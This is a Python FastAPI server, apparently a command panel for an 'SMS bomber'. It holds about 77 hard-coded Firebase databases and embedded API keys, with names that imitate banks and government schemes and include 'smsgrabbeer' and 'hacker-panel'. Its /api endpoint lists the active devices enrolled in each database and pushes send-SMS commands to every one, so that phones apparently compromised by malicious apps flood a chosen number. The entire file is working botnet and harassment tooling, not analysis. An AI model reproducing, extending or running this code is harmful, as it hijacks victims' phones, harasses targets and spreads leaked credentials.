# main.py
# Firebase SMS dispatch API — full config set baked in with explicit keys.
# Language: Python 3.11+, FastAPI.
#
# GET  /                              → health
# GET  /api?phone=...&message=...     → fire blast to all active devices
# GET  /devices                       → active device counts per firebase
# POST /config/firebase               → add/replace firebase configs at runtime
#
# Auth: ?key= or X-API-Key header.
# Configs: FIREBASE_CONFIGS env var (JSON array) overrides the baked-in defaults.

import os
import json
import time
import asyncio
from typing import List, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel

# ─── config ──────────────────────────────────────────────────────────────────

PORT           = int(os.getenv("PORT", "3000"))
API_KEY        = os.getenv("API_KEY")
DEFAULT_FB_KEY = os.getenv("DEFAULT_FIREBASE_KEY", "AIzaSyC9pFnZUbEqZTtKbV4u-4j0VvmRJksXmQA")
FB_TIMEOUT     = int(os.getenv("FB_TIMEOUT", "8"))
MAX_WORKERS    = int(os.getenv("MAX_WORKERS", "20"))
PER_DEVICE     = int(os.getenv("SMS_PER_DEVICE", "1"))

if not API_KEY:
    raise SystemExit("API_KEY env is required — refusing to start")

# ─── baked-in configs (from Ukraine Custom Bomber) ───────────────────────────
# Two keys in use across the set:
#   - SHARED_KEY  → every firebase except goat-100a8
#   - GOAT_KEY    → goat-100a8 only
# Every entry carries an explicit key so nothing depends on the env default.

SHARED_KEY = "AIzaSyC9pFnZUbEqZTtKbV4u-4j0VvmRJksXmQA"
GOAT_KEY   = "AIzaSyB-35FYDl-4E3hpOa1LyIv0Y2SkHEHjqUE"

BAKED_CONFIGS: List[Dict[str, str]] = [
    {"url": "https://priiieieie-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://godsbase-7c42e-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://nomorechor-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",                  "key": SHARED_KEY},
    {"url": "https://cwpiah-default-rtdb.firebaseio.com",                             "key": SHARED_KEY},
    {"url": "https://medical2-579d3-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://kali-1b217-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://prof-b6a64-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://junaid-cea15-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://kingu-2dbb9-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://hghg-6f0a8-default-rtdb.asia-southeast1.firebasedatabase.app",   "key": SHARED_KEY},
    {"url": "https://jeko-c11ef-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://sappu-e8d46-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://sastaapp-394cd-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://kishm-1d858-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://raj-developer-7efe9-default-rtdb.firebaseio.com",                "key": SHARED_KEY},
    {"url": "https://maxbhai-b8d3a-default-rtdb.firebaseio.com",                      "key": SHARED_KEY},
    {"url": "https://tracegod-168d5-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://dipanshu-bf4d2-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://novap7-725ff-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://chfjfj-c2857-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app",  "key": SHARED_KEY},
    {"url": "https://chhnuk05-3188e-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://ppoi02-default-rtdb.firebaseio.com",                             "key": SHARED_KEY},
    {"url": "https://phone55-d7d89-default-rtdb.firebaseio.com",                      "key": SHARED_KEY},
    {"url": "https://raj-admin-nokia-default-rtdb.firebaseio.com",                    "key": SHARED_KEY},
    {"url": "https://muskhshj-default-rtdb.firebaseio.com",                           "key": SHARED_KEY},
    {"url": "https://shilpa-e712a-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://bholanitish-73c07-default-rtdb.firebaseio.com",                  "key": SHARED_KEY},
    {"url": "https://pablo-5a0d2-default-rtdb.asia-southeast1.firebasedatabase.app",  "key": SHARED_KEY},
    {"url": "https://vggogo-79fcb-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://bandhan2-7jan-default-rtdb.firebaseio.com",                      "key": SHARED_KEY},
    {"url": "https://customer03support-default-rtdb.firebaseio.com",                  "key": SHARED_KEY},
    {"url": "https://prof-blast-default-rth.firebaseio.com",                          "key": SHARED_KEY},
    {"url": "https://goat-100a8-default-rtdb.firebaseio.com",                         "key": GOAT_KEY},
    {"url": "https://sohan-6d9e1-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://admin-panel-2272-default-rtdb.firebaseio.com",                   "key": SHARED_KEY},
    {"url": "https://hospital-14-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://suraj1932-468ad-default-rtdb.firebaseio.com",                    "key": SHARED_KEY},
    {"url": "https://yourfirebase-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://hopital-new-12-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://newpenal01-f0c2c-default-rtdb.firebaseio.com",                   "key": SHARED_KEY},
    {"url": "https://raj-parsonal-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://e3turnament11-default-rtdb.firebaseio.com",                      "key": SHARED_KEY},
    {"url": "https://chudgy-1cdca-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://singhaana-6f199-default-rtdb.firebaseio.com",                    "key": SHARED_KEY},
    {"url": "https://ghostx-panel-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://vvvvv-b5eae-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://rto-34-1f836-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://rto3-53dc7-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://expert-5e1a0-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://axis-bank-bf055-default-rtdb.firebaseio.com",                    "key": SHARED_KEY},
    {"url": "https://cs2xc-3951e-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://aditya-9f66b-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://axisjames-default-rtdb.firebaseio.com",                          "key": SHARED_KEY},
    {"url": "https://myabtar-default-rtdb.firebaseio.com",                            "key": SHARED_KEY},
    {"url": "https://ravan-187d8-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://kumarlive1-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://human-34-kumar-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://egale-74-default-rtdb.firebaseio.com",                           "key": SHARED_KEY},
    {"url": "https://photo-b3023-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://koya-7acd9-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://radhe-d31aa-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://puja-app-50785-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://hdfc-561e8-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://hacker-panel-dcc53-default-rtdb.firebaseio.com",                 "key": SHARED_KEY},
    {"url": "https://jaduopop-a9a12-default-rtdb.firebaseio.com",                     "key": SHARED_KEY},
    {"url": "https://gggggg-979bd-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://pm-kisan-111-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://pmnr1newad-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://myapp-8228a-default-rtdb.firebaseio.com",                        "key": SHARED_KEY},
    {"url": "https://csforme-dc64a-default-rtdb.firebaseio.com",                      "key": SHARED_KEY},
    {"url": "https://mano99-default-rtdb.firebaseio.com",                             "key": SHARED_KEY},
    {"url": "https://maxa29-f652e-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
    {"url": "https://aaaa-b3749-default-rtdb.firebaseio.com",                         "key": SHARED_KEY},
    {"url": "https://runjun-master-panel-default-rtdb.firebaseio.com",                "key": SHARED_KEY},
    {"url": "https://jpicku-47790-default-rtdb.firebaseio.com",                       "key": SHARED_KEY},
]

# ─── config list (env overrides baked-in) ────────────────────────────────────

_configs: List[Dict[str, str]] = []
_config_lock = asyncio.Lock()

def _normalize(items) -> List[Dict[str, str]]:
    out = []
    for item in items:
        if isinstance(item, dict) and item.get("url"):
            out.append({
                "url": item["url"].rstrip("/"),
                "key": item.get("key") or DEFAULT_FB_KEY,
            })
        elif isinstance(item, str):
            out.append({"url": item.rstrip("/"), "key": DEFAULT_FB_KEY})
    return out

def _load_configs() -> List[Dict[str, str]]:
    """Env FIREBASE_CONFIGS wins if set; otherwise use baked-in list."""
    raw = os.getenv("FIREBASE_CONFIGS", "").strip()
    if not raw:
        return _normalize(BAKED_CONFIGS)
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as e:
        raise SystemExit(f"FIREBASE_CONFIGS is not valid JSON: {e}")
    if not isinstance(parsed, list):
        raise SystemExit("FIREBASE_CONFIGS must be a JSON array")
    return _normalize(parsed)

_configs = _load_configs()

# ─── firebase helpers ────────────────────────────────────────────────────────

def fb_get(url: str, key: str, path: str):
    try:
        r = requests.get(f"{url}/{path}.json?auth={key}", timeout=FB_TIMEOUT)
        return r.json() if r.status_code == 200 else None
    except Exception:
        return None

def fb_put(url: str, key: str, path: str, data) -> bool:
    try:
        r = requests.put(f"{url}/{path}.json?auth={key}", json=data, timeout=FB_TIMEOUT)
        return r.status_code == 200
    except Exception:
        return False

def _count_active(cfg: Dict[str, str]) -> int:
    clients = fb_get(cfg["url"], cfg["key"], "clients") or {}
    if not isinstance(clients, dict):
        return 0
    return sum(1 for d in clients.values() if isinstance(d, dict) and d.get("status", False))

def _fetch_devices() -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    if not _configs:
        return out

    def _one(cfg):
        local = []
        clients = fb_get(cfg["url"], cfg["key"], "clients") or {}
        if isinstance(clients, dict):
            for did, dev in clients.items():
                if isinstance(dev, dict) and dev.get("status", False):
                    local.append({"cfg": cfg, "device_id": did})
        return local

    workers = min(32, max(4, len(_configs)))
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for fut in as_completed([pool.submit(_one, c) for c in _configs]):
            try:
                out.extend(fut.result())
            except Exception:
                pass
    return out

def _put_one(item: Dict[str, Any], phone: str, message: str) -> bool:
    cfg = item["cfg"]
    payload = {
        "sendSms": {
            "from": 1,
            "to": phone,
            "message": message,
            "timestamp": int(time.time() * 1000),
            "isSended": False,
        }
    }
    return fb_put(cfg["url"], cfg["key"], f"clients/{item['device_id']}/webhookEvent", payload)

def _run_blast(phone: str, message: str, per_device: int) -> Dict[str, Any]:
    t0 = time.time()
    devices = _fetch_devices()
    if not devices:
        return {
            "ok": False,
            "reason": "no_active_devices",
            "devices": 0, "sent": 0, "failed": 0,
            "elapsedMs": int((time.time() - t0) * 1000),
        }

    jobs = []
    for d in devices:
        for _ in range(per_device):
            jobs.append(d)

    sent = 0
    failed = 0
    batch_size = max(1, MAX_WORKERS * 2)

    for i in range(0, len(jobs), batch_size):
        batch = jobs[i:i + batch_size]
        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(batch))) as pool:
            results = list(pool.map(lambda it: _put_one(it, phone, message), batch))
        sent += sum(1 for r in results if r)
        failed += sum(1 for r in results if not r)

    return {
        "ok": sent > 0,
        "phone": phone,
        "devices": len(devices),
        "perDevice": per_device,
        "sent": sent,
        "failed": failed,
        "elapsedMs": int((time.time() - t0) * 1000),
    }

# ─── http ────────────────────────────────────────────────────────────────────

app = FastAPI(title="firebase-sms-api", docs_url=None, redoc_url=None)

def _auth(req: Request):
    key = req.query_params.get("key") or req.headers.get("x-api-key")
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="unauthorized")

@app.get("/")
async def health():
    return {
        "ok": True,
        "service": "firebase-sms-api",
        "firebases": len(_configs),
        "configSource": "env" if os.getenv("FIREBASE_CONFIGS", "").strip() else "baked",
        "maxWorkers": MAX_WORKERS,
        "perDeviceDefault": PER_DEVICE,
    }

@app.get("/api")
async def api(req: Request):
    _auth(req)
    q = req.query_params
    phone = "".join(c for c in (q.get("phone") or "") if c.isdigit() or c == "+")
    message = q.get("message") or ""
    if not phone or len(phone) < 7:
        raise HTTPException(400, "phone required (digits, optional leading +)")
    if not message:
        raise HTTPException(400, "message required")

    per_device = max(1, min(int(q.get("per_device", PER_DEVICE)), 50))
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, _run_blast, phone, message, per_device)
    return result

@app.get("/devices")
async def devices(req: Request):
    _auth(req)
    loop = asyncio.get_running_loop()

    def _scan():
        rows = []
        total = 0
        for cfg in _configs:
            n = _count_active(cfg)
            total += n
            rows.append({"url": cfg["url"], "active": n})
        rows.sort(key=lambda r: r["active"], reverse=True)
        return {"total": total, "firebases": len(_configs), "configs": rows}

    return await loop.run_in_executor(None, _scan)

class ConfigBody(BaseModel):
    configs: List[Dict[str, str]]
    replace: bool = False

@app.post("/config/firebase")
async def add_config(req: Request, body: ConfigBody):
    _auth(req)
    added = 0
    async with _config_lock:
        if body.replace:
            _configs.clear()
        existing = {c["url"] for c in _configs}
        for item in body.configs:
            url = (item.get("url") or "").rstrip("/")
            if not url or url in existing:
                continue
            if "firebase" not in url and "firebasedatabase" not in url:
                continue
            if not url.startswith("http"):
                url = "https://" + url
            _configs.append({"url": url, "key": item.get("key") or DEFAULT_FB_KEY})
            existing.add(url)
            added += 1
    return {"ok": True, "added": added, "total": len(_configs)}
